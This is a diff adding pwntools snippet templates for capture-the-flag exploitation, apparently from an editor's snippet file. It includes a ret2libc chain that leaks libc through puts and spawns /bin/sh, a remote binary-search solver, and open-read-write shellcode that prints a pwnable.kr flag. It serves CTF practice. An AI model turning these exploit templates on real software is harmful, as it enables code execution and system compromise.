@@ -11,3 +11,258 @@ snippet importscrypto
  import codecs
  import random
 
+
+snippet pwn_solve_regex
+ from pwn import *
+ import re
+ import sys
+ context.log_level = 'debug'
+ HOST = "0"
+ PORT = 9007
+ session = remote(HOST, PORT)
+  
+  session.recvuntil(b"Ready?")
+  pattern_q = rb"""N=(\d+) C=(\d+)"""
+  pattern_a = rb"(\d+)"
+  while True:
+      question_d = session.recvline_regex(pattern_q)
+      question = re.search(pattern_q, question_d)
+      n, c = question.groups()
+      n, c = int(n), int(c)
+      print(n, c)
+      l, r = 0, n
+      for _ in range(c+1):
+  
+          mid = (l+r)//2
+          numbers = b" ".join([str(i).encode() for i in range(l, mid+1)])
+          session.send(numbers + b"\n")
+  
+          ans_d = session.recvline()
+          ans = re.search(pattern_a, ans_d)
+          x = ans.groups()[0]
+          x = int(x.decode())
+  
+          if(x % 10 == 0):
+              l = mid +1
+          else:
+              r = mid
+  session.interactive()
+ sys.exit(0)
+
+
+
+
+snippet pwn_exploit
+ #!/usr/bin/env python3
+  # pwn_snippets.py
+  # Two reusable pwntools snippets: `pwn_solve` (template) and `pwn_exploit` (practical exploit helpers)
+  # Usage: copy the function you need into your exploit script and customize.
+  
+  from pwn import *
+  
+  # -----------------------------
+  # snippet: pwn_solve
+  # Minimal, clear scaffold to solve typical pwntable challenges (local/remote/gdb)
+  # Customize: BINARY, LIBC (optional), REMOTE_HOST/PORT
+  # -----------------------------
+  
+  def pwn_solve(BINARY, LIBC=None, remote_addr=None, gdb_script=None):
+      # Setup
+      context.binary = ELF(BINARY)
+      elf = context.binary
+      if LIBC:
+          libc = ELF(LIBC)
+      else:
+          libc = None
+  
+      def start():
+          if remote_addr:
+              host, port = remote_addr
+              return remote(host, port)
+          if gdb_script:
+              return gdb.debug([BINARY], gdb_script)
+          return process([BINARY])
+  
+      io = start()
+  
+      # Helpers
+      def ru(delim): return io.recvuntil(delim)
+      def rl(): return io.recvline()
+      def sla(a, b): return io.sendlineafter(a, b)
+      def sa(a, b): return io.sendafter(a, b)
+      def leak(addr):
+          # generic leak helper (send format-string / read memory as needed)
+          return u64(io.recvn(8).ljust(8, b"\x00"))
+  
+      # Example flow (adjust to target):
+      # 1) leak puts@GOT to get libc base
+      puts_plt = elf.plt.get('puts') if 'puts' in elf.plt else None
+      puts_got = elf.got.get('puts') if 'puts' in elf.got else None
+  
+      # Example: build ROP to leak puts
+      rop = ROP(elf)
+      rop.puts(puts_got)
+      rop.main()  # return to main for a second stage
+  
+      payload = flat({
+          0: b'A'*cyclic_find(0x6161616b) if False else b'A'*40,  # replace offset
+          40: rop.chain()
+      })
+  
+      io.sendline(payload)
+      leaked = io.recvline(timeout=2)
+      # parse leaked address (depends on binary)
+      try:
+          leaked_puts = u64(leaked.strip().ljust(8, b"\x00"))
+      except Exception:
+          leaked_puts = None
+  
+      if libc and leaked_puts:
+          libc_base = leaked_puts - libc.symbols['puts']
+          log.success(f"libc base: {hex(libc_base)}")
+          system = libc_base + libc.symbols['system']
+          binsh = libc_base + next(libc.search(b"/bin/sh"))
+          # second stage: call system('/bin/sh')
+          rop2 = ROP(elf)
+          rop2.raw(p64(system))
+          rop2.raw(p64(binsh))
+          payload2 = b'B'*40 + rop2.chain()
+          io.sendline(payload2)
+          io.interactive()
+      else:
+          # fallback: interactive to allow manual steps
+          io.interactive()
+  
+  
+  # -----------------------------
+  # snippet: pwn_exploit
+  # Helper functions + example showing format string, heap or ret2libc patterns.
+  # -----------------------------
+  
+  class Exploit:
+      def __init__(self, binary, libc_path=None, remote_addr=None, gdb_script=None):
+          context.binary = ELF(binary)
+          self.elf = context.binary
+          self.libc = ELF(libc_path) if libc_path else None
+          self.remote_addr = remote_addr
+          self.gdb_script = gdb_script
+  
+      def start(self):
+          if self.remote_addr:
+              return remote(*self.remote_addr)
+          if self.gdb_script:
+              return gdb.debug([self.elf.path], self.gdb_script)
+          return process([self.elf.path])
+  
+      @staticmethod
+      def p64(n): return p64(n)
+      @staticmethod
+      def u64(d): return u64(d.ljust(8, b"\x00"))
+  
+      def leak_via_puts(self, io, what):
+          # Build ROP to call puts(what) then return to main
+          rop = ROP(self.elf)
+          rop.puts(what)
+          rop.main()
+          padding = b'A' * 40  # adjust offset
+          payload = padding + rop.chain()
+          io.sendline(payload)
+          leaked = io.recvline(timeout=2)
+          return self.u64(leaked.strip())
+  
+  
+  # Example usage (uncomment and edit):
+  # if __name__ == '__main__':
+  #     # Simple ret2libc flow
+  #     pwn_solve('./vuln', LIBC='./libc.so.6', remote_addr=None, gdb_script=None)
+  
+  # End of pwn_snippets.py
+
+
+snippet pwn_bash
+ python3 - <<'PY'
+ from pwn import *
+ context.log_level = 'debug'
+ session = process('./lotto')
+ while True:
+     session.recvuntil(b'3. Exit')
+     session.sendline(b'1')
+     session.sendline(b'\x01'*6) 
+     session.recvuntil(b'bad luck')
+ PY
+
+
+snippet pwn_shellcode
+ from pwn import *
+ # Allows you to switch between local/GDB/remote from terminal
+ def start(argv=[], *a, **kw):
+     if args.GDB:  # Set GDBscript below
+         return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
+     elif args.REMOTE:  # ('server', 'port')
+         return remote(sys.argv[1], sys.argv[2], *a, **kw)
+     else:  # Run locally
+         return process([exe] + argv, *a, **kw)
+ 
+ def logbase(): log.info("libc base = %#x" % libc.address)
+ def logleak(name, val):  log.info(name+" = %#x" % val)
+ def sa(delim,data): return io.sendafter(delim,data)
+ def sla(delim,line): return io.sendlineafter(delim,line)
+ def sl(line): return io.sendline(line)
+ 
+ 
+ 
+ def one_gadget(filename, base_addr=0):
+   return [(int(i)+base_addr) for i in subprocess.check_output(['one_gadget', '--raw', '-l1', filename]).decode().split(' ')]
+ 
+ 
+ # Specify GDB script here (breakpoints etc)
+ gdbscript = '''
+ b *main+330
+ continue
+ '''.format(**locals())
+ 
+ context.terminal = ['tmux','splitw','-h']
+ # Binary filename
+ exe = './a'
+ # This will automatically get context arch, bits, os etc
+ elf = context.binary = ELF(exe, checksec=False)
+ # Change logging level to help with debugging (error/warning/info/debug)
+ context.log_level = 'debug'
+ 
+ # ===========================================================
+ #                    EXPLOIT GOES HERE
+ # ===========================================================
+ 
+ # Lib-C library, can use pwninit/patchelf to patch binary
+ # libc = ELF("./libc.so.6")
+ # ld = ELF("./ld-2.27.so")
+ 
+ 
+ # Start program
+ io = start()
+ 
+ # Build the payload
+ payload = asm("""
+ mov rax, 2
+ lea rdi, [rip+flag]
+ xor rsi, rsi
+ xor rdx, rdx
+ syscall
+ mov r8, rax
+ xor rax, rax
+ mov rdi, r8 
+ mov rsi, rsp
+ mov rdx, 70            
+ syscall
+ mov r9, rax
+ mov rax, 1                
+ mov rdi, 1              
+ mov rsi, rsp
+ mov rdx, r9            
+ syscall
+ flag: 
+               .string "this_is_pwnable.kr_flag_file_please_read_this_file.sorry_the_file_name_is_very_loooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooooo0000000000000000000000000ooooooooooooooooooooooo000000000000o0o0o0o0o0o0ong"
+ """)
+ io.sendline(payload)
+ # Got Shell?
+ io.interactive()
